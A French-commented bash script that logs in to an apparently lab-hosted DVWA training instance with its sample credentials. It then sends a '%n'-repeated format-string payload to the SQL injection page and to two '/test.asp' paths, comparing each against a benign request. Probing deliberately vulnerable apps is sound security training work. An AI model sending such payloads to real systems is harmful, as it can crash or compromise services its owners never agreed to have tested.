#!/usr/bin/env bash

set -uo pipefail

readonly BASE_URL="${BASE_URL:-https://dvwa.corp.fabriclab.ca}"
readonly DVWA_USERNAME="${DVWA_USERNAME:-gordonb}"
readonly DVWA_PASSWORD="${DVWA_PASSWORD:-abc123}"
readonly LOGIN_URL="${BASE_URL}/login.php"
readonly FORMAT_STRING_PAYLOAD="$(printf '%%n%.0s' {1..45})"

if ! command -v curl >/dev/null 2>&1; then
  echo "Erreur : curl est requis." >&2
  exit 1
fi

work_dir="$(mktemp -d)"
trap 'rm -rf -- "${work_dir}"' EXIT

authenticate() {
  local cookie_jar="$1"

  # Un fichier neuf garantit une nouvelle session pour chaque test.
  : >"${cookie_jar}"

  curl --silent --show-error --insecure --location \
    --cookie "${cookie_jar}" \
    --cookie-jar "${cookie_jar}" \
    --data-urlencode "username=${DVWA_USERNAME}" \
    --data-urlencode "password=${DVWA_PASSWORD}" \
    --data-urlencode "Login=Login" \
    --output /dev/null \
    --write-out 'Authentification: HTTP %{http_code}\n' \
    "${LOGIN_URL}"
}

run_test() {
  local test_number="$1"
  local path="$2"
  local id_value="$3"
  local cookie_jar="${work_dir}/cookies-${test_number}.txt"

  echo
  echo "===== Test ${test_number}: ${path} ====="

  if ! authenticate "${cookie_jar}"; then
    echo "Échec réseau pendant l'authentification du test ${test_number}." >&2
    return 1
  fi

  # --data-urlencode encode notamment les '%' du payload en '%25'. Le serveur
  # reçoit ainsi bien la valeur littérale '%n%n...' dans le paramètre id.
  curl --silent --show-error --insecure --location \
    --cookie "${cookie_jar}" \
    --cookie-jar "${cookie_jar}" \
    --get \
    --data-urlencode "id=${id_value}" \
    --data-urlencode "Submit=Submit" \
    --write-out $'\n--- HTTP %{http_code} | URL finale: %{url_effective} ---\n' \
    "${BASE_URL}${path}"
}

failures=0

run_test 1 '/vulnerabilities/sqli/' '1' || failures=$((failures + 1))
run_test 2 '/vulnerabilities/sqli/' "${FORMAT_STRING_PAYLOAD}" || failures=$((failures + 1))
run_test 3 '/test.asp/' "${FORMAT_STRING_PAYLOAD}" || failures=$((failures + 1))
run_test 4 '/test.asp' "${FORMAT_STRING_PAYLOAD}" || failures=$((failures + 1))

echo
if ((failures > 0)); then
  echo "${failures} test(s) interrompu(s) par une erreur curl." >&2
  exit 1
fi

echo "Les quatre tests sont terminés."
